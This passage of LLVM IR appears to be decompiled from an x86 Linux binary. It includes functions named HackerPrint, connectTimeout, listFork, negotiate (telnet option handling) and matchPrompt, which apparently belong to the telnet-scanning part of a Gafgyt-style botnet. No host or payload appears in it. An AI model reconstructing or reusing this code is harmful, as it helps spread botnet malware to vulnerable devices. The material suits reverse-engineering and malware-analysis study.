  %v1_80491a8 = urem i32 %tmp15, 32
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_80491ab = load i32, i32* @ebp, align 4
  %v2_80491ab = mul nuw nsw i32 %v2_80491a2, 4
  %v3_80491ab = add nsw i32 %v2_80491ab, -164
  %v4_80491ab = add i32 %v3_80491ab, %v0_80491ab
  %v5_80491ab = inttoptr i32 %v4_80491ab to i32*
  %v6_80491ab = load i32, i32* %v5_80491ab, align 4
  %v9_80491ab = shl i32 1, %v1_80491a8
  %v12_80491ab = or i32 %v6_80491ab, %v9_80491ab
  store i32 %v12_80491ab, i32* %v5_80491ab, align 4
  %v1_80491b6 = add i32 %tmp15, 1
  %v2_80491ba = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_80491d2 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_80491d2, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_80491d2, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049282, label %dec_label_pc_8049278.preheader

dec_label_pc_8049278.preheader:                   ; preds = %entry
  %v7_804927c45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804927c45, label %dec_label_pc_8049282, label %dec_label_pc_80491ec.lr.ph

dec_label_pc_80491ec.lr.ph:                       ; preds = %dec_label_pc_8049278.preheader
  br label %dec_label_pc_80491ec

dec_label_pc_80491ec:                             ; preds = %dec_label_pc_80491ec.lr.ph, %dec_label_pc_8049275
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_80491ec.lr.ph ], [ %v4_8049275, %dec_label_pc_8049275 ]
  %v0_80491ec = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_80491ec, i32* %eax.global-to-local, align 4
  %v3_80491fa = call i32 @HackerPrint(i32 %v0_80491ec, i32 ptrtoint ([5 x i8]* @global_var_8058597.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049227 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_804923d = load i32, i32* @ebp, align 4
  %v4_804923d = add i32 %v3_80491ab, %v0_804923d
  %v5_804923d = inttoptr i32 %v4_804923d to i32*
  %v6_804923d = load i32, i32* %v5_804923d, align 4
  %v12_804923d = or i32 %v6_804923d, %v9_80491ab
  store i32 %v12_804923d, i32* %v5_804923d, align 4
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_8049264 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_8049264, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049264, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8049282, label %dec_label_pc_8049275

dec_label_pc_8049275:                             ; preds = %dec_label_pc_80491ec
  %v4_8049275 = add nsw i32 %stack_var_-36.046, 1
  %v7_804927c = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804927c, label %dec_label_pc_8049282, label %dec_label_pc_80491ec

dec_label_pc_8049282:                             ; preds = %dec_label_pc_8049278.preheader, %dec_label_pc_80491ec, %dec_label_pc_8049275, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_804929a = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80492dc

dec_label_pc_8049291:                             ; preds = %dec_label_pc_80492dc
  %v0_8049291 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_8049291, i32* %eax.global-to-local, align 4
  %v5_80492a2 = call i32 @__libc_recv(i32 %v0_8049291, i32 %v2_804929a, i32 1, i32 0)
  store i32 %v5_80492a2, i32* %eax.global-to-local, align 4
  %v9_80492aa = icmp eq i32 %v5_80492a2, 1
  br i1 %v9_80492aa, label %dec_label_pc_80492c1, label %dec_label_pc_80492af

dec_label_pc_80492af:                             ; preds = %dec_label_pc_8049291
  %v4_80492af = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_80492af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80492f9

dec_label_pc_80492c1:                             ; preds = %dec_label_pc_8049291
  %v3_80492c1 = load i8, i8* %stack_var_-177, align 1
  %v4_80492c1 = sext i8 %v3_80492c1 to i32
  store i32 %v4_80492c1, i32* %eax.global-to-local, align 4
  %v4_80492c7 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80492c1, i8* %stack_var_-32.0, align 1
  %v5_80492cc = add i32 %v4_80492c7, 1
  %v22_80492cc = inttoptr i32 %v5_80492cc to i8*
  %v3_80492cf = load i8, i8* %stack_var_-177, align 1
  %v4_80492cf = sext i8 %v3_80492cf to i32
  %v6_80492cf = load i32, i32* %eax.global-to-local, align 4
  %v7_80492cf = and i32 %v6_80492cf, -256
  %v8_80492cf = or i32 %v7_80492cf, %v4_80492cf
  store i32 %v8_80492cf, i32* %eax.global-to-local, align 4
  %v10_80492d5 = icmp eq i8 %v3_80492cf, 10
  br i1 %v10_80492d5, label %dec_label_pc_80492ea, label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492c1
  %v4_80492d9 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80492dc

dec_label_pc_80492dc:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_80492d9
  %v7_80492e0 = phi i32 [ %tmp19, %dec_label_pc_8049282 ], [ %v8_80492cf, %dec_label_pc_80492d9 ]
  %stack_var_-32.0 = phi i8* [ %v1_8049167, %dec_label_pc_8049282 ], [ %v22_80492cc, %dec_label_pc_80492d9 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049282 ], [ %v4_80492d9, %dec_label_pc_80492d9 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_8049282 ], [ %v4_80492dc, %dec_label_pc_80492d9 ]
  %v4_80492dc = add i32 %stack_var_12.0, -1
  %v9_80492dc = sub i32 0, %stack_var_12.0
  %v10_80492dc = and i32 %stack_var_12.0, %v9_80492dc
  %v11_80492dc = icmp slt i32 %v10_80492dc, 0
  %v12_80492dc = icmp eq i32 %v4_80492dc, 0
  %v13_80492dc = icmp slt i32 %v4_80492dc, 0
  %v3_80492e0 = icmp eq i1 %v13_80492dc, %v11_80492dc
  %v4_80492e0 = icmp eq i1 %v12_80492dc, false
  %v5_80492e0 = and i1 %v4_80492e0, %v3_80492e0
  %v6_80492e0 = zext i1 %v5_80492e0 to i32
  %v8_80492e0 = and i32 %v7_80492e0, -256
  %v9_80492e0 = or i32 %v6_80492e0, %v8_80492e0
  store i32 %v9_80492e0, i32* %eax.global-to-local, align 4
  %v4_80492e6 = icmp eq i1 %v5_80492e0, false
  %v1_80492e8 = icmp eq i1 %v4_80492e6, false
  br i1 %v1_80492e8, label %dec_label_pc_8049291, label %dec_label_pc_80492ea

dec_label_pc_80492ea:                             ; preds = %dec_label_pc_80492c1, %dec_label_pc_80492dc
  %stack_var_-32.1 = phi i8* [ %v22_80492cc, %dec_label_pc_80492c1 ], [ %stack_var_-32.0, %dec_label_pc_80492dc ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80492f9

dec_label_pc_80492f9:                             ; preds = %dec_label_pc_80492af, %dec_label_pc_80492ea
  %storemerge = phi i32 [ -1, %dec_label_pc_80492af ], [ %stack_var_-28.0, %dec_label_pc_80492ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_80492ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80492ff, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80492dc, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_80492cc, { 1, 0 }
  uselistorder i32 %v1_80491a8, { 2, 1, 0 }
  uselistorder i32 %v2_804918e, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_80492f9, { 1, 0 }
  uselistorder label %dec_label_pc_80492ea, { 1, 0 }
  uselistorder label %dec_label_pc_80492dc, { 1, 0 }
  uselistorder label %dec_label_pc_8049282, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80491ec, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8049310 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804931b = icmp eq i32 %v2_8049310, 0
  %v1_804931f = icmp eq i1 %v4_804931b, false
  br i1 %v1_804931f, label %dec_label_pc_804933a, label %dec_label_pc_8049321

dec_label_pc_8049321:                             ; preds = %entry
  %v3_8049329 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805859c.22, i32 0, i32 0))
  br label %dec_label_pc_8049390

dec_label_pc_804933a:                             ; preds = %entry
  %v1_804933d = add i32 %v2_8049310, 16
  %v2_804933d = inttoptr i32 %v1_804933d to i32*
  %v3_804933d = load i32, i32* %v2_804933d, align 4
  %v1_8049353 = inttoptr i32 %v3_804933d to i32*
  %v2_8049353 = load i32, i32* %v1_8049353, align 4
  %v1_8049355 = icmp eq i32 %v2_8049353, 0
  br i1 %v1_8049355, label %dec_label_pc_8049390, label %dec_label_pc_8049359

dec_label_pc_8049359:                             ; preds = %dec_label_pc_804933a
  %v2_8049362 = load i32, i32* %v1_8049353, align 4
  %v1_8049367 = inttoptr i32 %v2_8049362 to i32*
  %v2_8049367 = load i32, i32* %v1_8049367, align 4
  %v2_8049369 = call i32 @__GI_inet_ntoa(i32 %v2_8049367)
  store i32 %v2_8049369, i32* @eax, align 4
  %v8_8049375 = inttoptr i32 %arg2 to i8*
  %v4_8049378 = call i32 @strcpy(i8* %v8_8049375, i32 %v2_8049369)
  br label %dec_label_pc_8049390

dec_label_pc_8049390:                             ; preds = %dec_label_pc_804933a, %dec_label_pc_8049359, %dec_label_pc_8049321
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8049359 ], [ 1, %dec_label_pc_8049321 ], [ 1, %dec_label_pc_804933a ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder label %dec_label_pc_8049390, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8049398 = load i32, i32* @edi, align 4
  %v3_80493a9 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80493b4 = or i32 %v3_80493a9, 2048
  %v3_80493c6 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80493b4)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80493d7 = urem i32 %arg3, 65536
  %v1_80493e0 = call i32 @htons(i32 %v1_80493d7)
  store i32 %arg2, i32* @edx, align 4
  %v3_80493fa = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049402 = icmp eq i32 %v3_80493fa, 0
  br i1 %v1_8049402, label %dec_label_pc_8049415, label %dec_label_pc_8049406

dec_label_pc_8049406:                             ; preds = %entry
  br label %dec_label_pc_8049552

dec_label_pc_8049415:                             ; preds = %entry
  %v2_80493f2 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049434 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80493f2, i32 16)
  %v5_804943f = icmp slt i32 %v3_8049434, 0
  %v1_8049443 = icmp eq i1 %v5_804943f, false
  br i1 %v1_8049443, label %dec_label_pc_8049519, label %dec_label_pc_8049449

dec_label_pc_8049449:                             ; preds = %dec_label_pc_8049415
  %v1_8049449 = call i32 @__errno_location(i32 %v3_8049434)
  %v1_804944e = inttoptr i32 %v1_8049449 to i32*
  %v2_804944e = load i32, i32* %v1_804944e, align 4
  %v9_8049450 = icmp eq i32 %v2_804944e, 115
  %v1_8049453 = icmp eq i1 %v9_8049450, false
  br i1 %v1_8049453, label %dec_label_pc_804950d, label %dec_label_pc_8049459

dec_label_pc_8049459:                             ; preds = %dec_label_pc_8049449
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049476 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049476, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804947d = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804948a = udiv i32 %arg1, 32
  %v1_8049490 = urem i32 %arg1, 32
  %v0_8049493 = load i32, i32* @ebp, align 4
  %v2_8049493 = mul nuw nsw i32 %v2_804948a, 4
  %v3_8049493 = add nsw i32 %v2_8049493, -164
  %v4_8049493 = add i32 %v3_8049493, %v0_8049493
  %v5_8049493 = inttoptr i32 %v4_8049493 to i32*
  %v6_8049493 = load i32, i32* %v5_8049493, align 4
  %v9_8049493 = shl i32 1, %v1_8049490
  %v12_8049493 = or i32 %v6_8049493, %v9_8049493
  store i32 %v12_8049493, i32* %v5_8049493, align 4
  %v1_804949e = add i32 %arg1, 1
  %v2_80494a2 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80494b5 = call i32 @__libc_select(i32 %v1_804949e, i32 0, i32 %v2_8049476, i32 0, i32 %v2_80494a2)
  %tmp33 = icmp slt i32 %v5_80494b5, 1
  br i1 %tmp33, label %dec_label_pc_8049501, label %dec_label_pc_80494c1

dec_label_pc_80494c1:                             ; preds = %dec_label_pc_8049459
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80494ce = ptrtoint i32* %stack_var_-180 to i32
  %v2_80494d5 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80494e3 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80494d5, i32 %v2_80494ce)
  %v3_80494eb = load i32, i32* %stack_var_-184, align 4
  %v1_80494f1 = icmp eq i32 %v3_80494eb, 0
  br i1 %v1_80494f1, label %dec_label_pc_8049519, label %dec_label_pc_80494f5

dec_label_pc_80494f5:                             ; preds = %dec_label_pc_80494c1
  br label %dec_label_pc_8049552

dec_label_pc_8049501:                             ; preds = %dec_label_pc_8049459
  br label %dec_label_pc_8049552

dec_label_pc_804950d:                             ; preds = %dec_label_pc_8049449
  br label %dec_label_pc_8049552

dec_label_pc_8049519:                             ; preds = %dec_label_pc_80494c1, %dec_label_pc_8049415
  %v3_8049523 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804952e = and i32 %v3_8049523, -2049
  %v3_8049540 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804952e)
  br label %dec_label_pc_8049552

dec_label_pc_8049552:                             ; preds = %dec_label_pc_804950d, %dec_label_pc_8049501, %dec_label_pc_80494f5, %dec_label_pc_8049406, %dec_label_pc_8049519
  %v3_8049552 = phi i32 [ 0, %dec_label_pc_804950d ], [ 0, %dec_label_pc_8049501 ], [ 0, %dec_label_pc_80494f5 ], [ 0, %dec_label_pc_8049406 ], [ 1, %dec_label_pc_8049519 ]
  store i32 %v0_8049398, i32* @edi, align 4
  ret i32 %v3_8049552

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049552, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049560 = load i32, i32* @ebx, align 4
  store i32 %v0_8049560, i32* %stack_var_-8, align 4
  %v1_8049564 = call i32 @__libc_fork(i32 %v0_8049560)
  %v4_804956c = icmp eq i32 %v1_8049564, 0
  %v1_8049570 = icmp eq i1 %v4_804956c, false
  br i1 %v1_8049570, label %dec_label_pc_804957d, label %dec_label_pc_8049572

dec_label_pc_8049572:                             ; preds = %entry
  br label %dec_label_pc_8049661

dec_label_pc_804957d:                             ; preds = %entry
  %v0_804957d = load i32, i32* @global_var_805d488.23, align 8
  %v0_8049582 = load i32, i32* @global_var_805d48c.24, align 4
  %v1_8049588 = add i32 %v0_804957d, 1
  %v5_8049588 = icmp eq i32 %v0_804957d, -1
  %v2_804958b = zext i1 %v5_8049588 to i32
  %v3_804958b = add i32 %v2_804958b, %v0_8049582
  store i32 %v1_8049588, i32* @global_var_805d488.23, align 8
  store i32 %v3_804958b, i32* @global_var_805d48c.24, align 4
  %v2_80495a8 = mul i32 %v1_8049588, 4
  %v1_80495ab = add i32 %v2_80495a8, 4
  %v1_80495b2 = call i32 @malloc(i32 %v1_80495ab)
  br label %dec_label_pc_80495e8

dec_label_pc_80495c6:                             ; preds = %dec_label_pc_80495e8, %dec_label_pc_8049619
  %v2_80495c9 = mul i32 %storemerge1, 4
  %v5_80495ce = add i32 %v2_80495c9, %v1_80495b2
  %v0_80495d9 = load i32, i32* @global_var_8063714.25, align 4
  %v2_80495de = add i32 %v0_80495d9, %v2_80495c9
  %v1_80495e1 = inttoptr i32 %v2_80495de to i32*
  %v2_80495e1 = load i32, i32* %v1_80495e1, align 4
  %v2_80495e3 = inttoptr i32 %v5_80495ce to i32*
  store i32 %v2_80495e1, i32* %v2_80495e3, align 4
  %v4_80495e5 = add i32 %storemerge1, 1
  br label %dec_label_pc_80495e8

dec_label_pc_80495e8:                             ; preds = %dec_label_pc_804957d, %dec_label_pc_80495c6
  %storemerge1 = phi i32 [ %v4_80495e5, %dec_label_pc_80495c6 ], [ 0, %dec_label_pc_804957d ]
  %v0_80495f6 = load i32, i32* @global_var_805d488.23, align 8
  %v0_80495fb = load i32, i32* @global_var_805d48c.24, align 4
  %v4_8049605 = icmp ne i32 %v0_80495f6, 0
  %v2_8049608 = zext i1 %v4_8049605 to i32
  %v3_8049608 = add i32 %v0_80495fb, -1
  %v4_8049608 = add i32 %v3_8049608, %v2_8049608
  store i32 %v4_8049608, i32* @ebx, align 4
  %v10_8049614 = icmp eq i32 %v4_8049608, 0
  br i1 %v10_8049614, label %dec_label_pc_8049619, label %dec_label_pc_80495c6

dec_label_pc_8049619:                             ; preds = %dec_label_pc_80495e8
  %v1_8049605 = add i32 %v0_80495f6, -1
  %v10_8049624 = icmp ult i32 %storemerge1, %v1_8049605
  br i1 %v10_8049624, label %dec_label_pc_80495c6, label %dec_label_pc_8049629

dec_label_pc_8049629:                             ; preds = %dec_label_pc_8049619
  %v2_8049634 = mul i32 %v0_80495f6, 4
  %v5_8049637 = add i32 %v1_80495b2, -4
  %v1_804963a = add i32 %v5_8049637, %v2_8049634
  store i32 %v1_804963a, i32* @edx, align 4
  %v2_8049640 = inttoptr i32 %v1_804963a to i32*
  store i32 %v1_8049564, i32* %v2_8049640, align 4
  %v0_8049642 = load i32, i32* @global_var_8063714.25, align 4
  %v1_804964b = call i32 @free(i32 %v0_8049642)
  store i32 %v1_80495b2, i32* @global_var_8063714.25, align 4
  store i32 %v1_8049564, i32* @ecx, align 4
  br label %dec_label_pc_8049661

dec_label_pc_8049661:                             ; preds = %dec_label_pc_8049572, %dec_label_pc_8049629
  %v3_8049664 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049664, i32* @ebx, align 4
  ret i32 %v1_8049564

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80495c9, { 1, 0 }
  uselistorder i32 %v1_80495b2, { 2, 0, 1 }
  uselistorder i32 %v0_804957d, { 1, 0 }
  uselistorder label %dec_label_pc_8049661, { 1, 0 }
  uselistorder label %dec_label_pc_80495e8, { 1, 0 }
  uselistorder label %dec_label_pc_80495c6, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049669 = load i32, i32* @ebp, align 4
  store i32 %v0_8049669, i32* %stack_var_-4, align 4
  %v1_8049672 = add i32 %arg2, 1
  %v1_8049673 = inttoptr i32 %v1_8049672 to i8*
  %v2_8049673 = load i8, i8* %v1_8049673, align 1
  %v5_8049673 = and i32 %v1_8049672, -256
  %v9_804967f = icmp ult i8 %v2_8049673, -5
  br i1 %v9_804967f, label %dec_label_pc_804975f, label %dec_label_pc_804968c

dec_label_pc_804968c:                             ; preds = %entry
  %v7_8049693 = icmp eq i8 %v2_8049673, -1
  br i1 %v7_8049693, label %dec_label_pc_8049695, label %dec_label_pc_80496af

dec_label_pc_8049695:                             ; preds = %dec_label_pc_804968c
  br label %dec_label_pc_804975f

dec_label_pc_80496af:                             ; preds = %dec_label_pc_804968c
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_80496ba = ptrtoint i32* %stack_var_-5 to i32
  %v4_80496c1 = call i32 @__libc_send(i32 %arg1, i32 %v2_80496ba, i32 1, i32 16384)
  %v2_80496cd = load i8, i8* %v1_8049673, align 1
  %v11_80496cf = icmp eq i8 %v2_80496cd, -4
  %v1_80496d1 = icmp eq i1 %v11_80496cf, false
  br i1 %v1_80496d1, label %dec_label_pc_80496d9, label %dec_label_pc_80496d3

dec_label_pc_80496d3:                             ; preds = %dec_label_pc_80496af
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_80496d9:                             ; preds = %dec_label_pc_80496af
  %v2_80496dd = load i8, i8* %v1_8049673, align 1
  %v11_80496df = icmp eq i8 %v2_80496dd, -2
  %v1_80496e1 = icmp eq i1 %v11_80496df, false
  br i1 %v1_80496e1, label %dec_label_pc_80496e9, label %dec_label_pc_80496e3

dec_label_pc_80496e3:                             ; preds = %dec_label_pc_80496d9
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_80496e9:                             ; preds = %dec_label_pc_80496d9
  %v2_80496ed = load i8, i8* %v1_8049673, align 1
  %v10_80496ef = icmp eq i8 %v2_80496ed, 3
  %v1_80496f1 = icmp eq i1 %v10_80496ef, false
  %v11_8049715 = icmp eq i8 %v2_80496ed, -3
  %v1_8049717 = icmp eq i1 %v11_8049715, false
  br i1 %v1_80496f1, label %dec_label_pc_804970f, label %dec_label_pc_80496f3

dec_label_pc_80496f3:                             ; preds = %dec_label_pc_80496e9
  %. = select i1 %v1_8049717, i32 253, i32 251
  %v7_8049707 = or i32 %., %v5_8049673
  store i32 %v7_8049707, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_804970f:                             ; preds = %dec_label_pc_80496e9
  %.2 = select i1 %v1_8049717, i32 254, i32 252
  %v5_8049723 = load i32, i32* @edx, align 4
  %v6_8049723 = and i32 %v5_8049723, -256
  %v7_8049723 = or i32 %v6_8049723, %.2
  store i32 %v7_8049723, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_8049729:                             ; preds = %dec_label_pc_80496f3, %dec_label_pc_80496e3, %dec_label_pc_80496d3, %dec_label_pc_804970f
  %v4_8049737 = call i32 @__libc_send(i32 %arg1, i32 %v2_80496ba, i32 1, i32 16384)
  %v1_8049742 = add i32 %arg2, 2
  %v4_8049750 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049742, i32 1, i32 16384)
  %v2_8049762.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804975f

dec_label_pc_804975f:                             ; preds = %dec_label_pc_8049695, %dec_label_pc_8049729, %entry
  %v2_8049762 = phi i32 [ %v0_8049669, %dec_label_pc_8049695 ], [ %v2_8049762.pre, %dec_label_pc_8049729 ], [ %v0_8049669, %entry ]
  store i32 %v2_8049762, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804975f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049729, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049772 = ptrtoint i8* %arg1 to i32
  %v3_8049783 = call i32 @_strlen(i8* %arg1)
  %v4_8049783 = mul i32 %v3_8049783, -1
  %v1_8049789 = sub i32 0, %v4_8049783
  %v6_80497b0 = sub i32 %v4_8049772, %v4_8049783
  br label %dec_label_pc_8049832

dec_label_pc_80497a0:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_80497d9, %dec_label_pc_80497c2, %dec_label_pc_80497ab
  %v4_80497a0 = add nsw i32 %stack_var_-12.025, 1
  %v7_80497a9 = icmp slt i32 %v4_80497a0, %v1_8049789
  br i1 %v7_80497a9, label %dec_label_pc_80497ab, label %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge

dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge: ; preds = %dec_label_pc_80497a0, %dec_label_pc_80497a3.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_80497a3.preheader ], [ %v4_80497a0, %dec_label_pc_80497a0 ]
  %.pre = sub i32 %v6_80497b0, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049807

dec_label_pc_80497ab:                             ; preds = %dec_label_pc_80497a3.preheader, %dec_label_pc_80497a0
  %stack_var_-12.025 = phi i32 [ %v4_80497a0, %dec_label_pc_80497a0 ], [ %stack_var_-12.1, %dec_label_pc_80497a3.preheader ]
  %v2_80497b8 = sub i32 %v6_80497b0, %stack_var_-12.025
  %v1_80497bc = inttoptr i32 %v2_80497b8 to i8*
  %v2_80497bc = load i8, i8* %v1_80497bc, align 1
  %v4_80497be = icmp eq i8 %v2_80497bc, 0
  br i1 %v4_80497be, label %dec_label_pc_80497a0, label %dec_label_pc_80497c2

dec_label_pc_80497c2:                             ; preds = %dec_label_pc_80497ab
  %v2_80497d3 = load i8, i8* %v1_80497bc, align 1
  %v7_80497d5 = icmp eq i8 %v2_80497d3, 32
  br i1 %v7_80497d5, label %dec_label_pc_80497a0, label %dec_label_pc_80497d9

dec_label_pc_80497d9:                             ; preds = %dec_label_pc_80497c2
  %v2_80497ea = load i8, i8* %v1_80497bc, align 1
  %v10_80497ec = icmp eq i8 %v2_80497ea, 13
  br i1 %v10_80497ec, label %dec_label_pc_80497a0, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497d9
  %v2_8049801 = load i8, i8* %v1_80497bc, align 1
  %v10_8049803 = icmp eq i8 %v2_8049801, 10
  br i1 %v10_8049803, label %dec_label_pc_80497a0, label %dec_label_pc_8049807

dec_label_pc_8049807:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge ], [ %stack_var_-12.025, %dec_label_pc_80497f0 ]
  %v1_8049818.pre-phi = phi i8* [ %.pre9, %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge ], [ %v1_80497bc, %dec_label_pc_80497f0 ]
  %v2_8049818 = load i8, i8* %v1_8049818.pre-phi, align 1
  %v6_804981d = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_80585aa.26 to i32)
  %v1_8049820 = inttoptr i32 %v6_804981d to i8*
  %v2_8049820 = load i8, i8* %v1_8049820, align 1
  %v15_8049822 = icmp eq i8 %v2_8049818, %v2_8049820
  %v1_8049824 = icmp eq i1 %v15_8049822, false
  br i1 %v1_8049824, label %dec_label_pc_804982f, label %dec_label_pc_804985c

dec_label_pc_804982f:                             ; preds = %dec_label_pc_8049807
  %v4_804982f = add i32 %storemerge2, 1
  br label %dec_label_pc_8049832

dec_label_pc_8049832:                             ; preds = %entry, %dec_label_pc_804982f
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_804982f ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_804982f, %dec_label_pc_804982f ]
  %v3_8049846 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80585aa.26, i32 0, i32 0))
  %v7_804984d = icmp ult i32 %storemerge2, %v3_8049846
  br i1 %v7_804984d, label %dec_label_pc_80497a3.preheader, label %dec_label_pc_804985c

dec_label_pc_80497a3.preheader:                   ; preds = %dec_label_pc_8049832
  %v7_80497a924 = icmp slt i32 %stack_var_-12.1, %v1_8049789
